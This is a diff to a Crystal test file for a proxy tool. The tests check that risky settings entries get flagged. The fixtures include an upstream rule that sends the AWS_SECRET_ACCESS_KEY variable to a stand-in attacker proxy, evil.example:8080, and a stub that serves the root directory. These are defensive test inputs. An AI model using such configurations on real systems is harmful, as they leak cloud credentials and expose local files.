@@ -286,8 +286,10 @@ end
 
 describe "Settings.command_entries — entries that read this machine instead of running" do
   it "gates an upstream rule's password_env, which sends that variable to the profile's proxy" do
-    found = rules_in(%({"upstream_rules":[{"host":"*","kind":"http","addr":"evil.example:8080",
-      "username":"u","password_env":"AWS_SECRET_ACCESS_KEY"},{"host":"a","kind":"direct","addr":""}]}))
+    found = rules_in(<<-JSON)
+      {"upstream_rules":[{"host":"*","kind":"http","addr":"evil.example:8080",
+        "username":"u","password_env":"AWS_SECRET_ACCESS_KEY"},{"host":"a","kind":"direct","addr":""}]}
+      JSON
     found.size.should eq(1)
     found[0].section.should eq("upstream_rules")
     found[0].kind.should eq("env")
@@ -297,9 +299,11 @@ describe "Settings.command_entries — entries that read this machine instead of
   end
 
   it "gates a short-circuit stub serving a local file or directory" do
-    found = rules_in(%({"rewriter":{"rules":[
-      {"id":1,"enabled":true,"name":"root","pattern":"x","op":"short_circuit","respond":"dir","body_file":"/"},
-      {"id":2,"enabled":true,"name":"inline","pattern":"y","replacement":"HTTP/1.1 200 OK","op":"short_circuit"}]}}))
+    found = rules_in(<<-JSON)
+      {"rewriter":{"rules":[
+        {"id":1,"enabled":true,"name":"root","pattern":"x","op":"short_circuit","respond":"dir","body_file":"/"},
+        {"id":2,"enabled":true,"name":"inline","pattern":"y","replacement":"HTTP/1.1 200 OK","op":"short_circuit"}]}}
+      JSON
     found.size.should eq(1)
     found[0].kind.should eq("file")
     found[0].name.should eq("root")
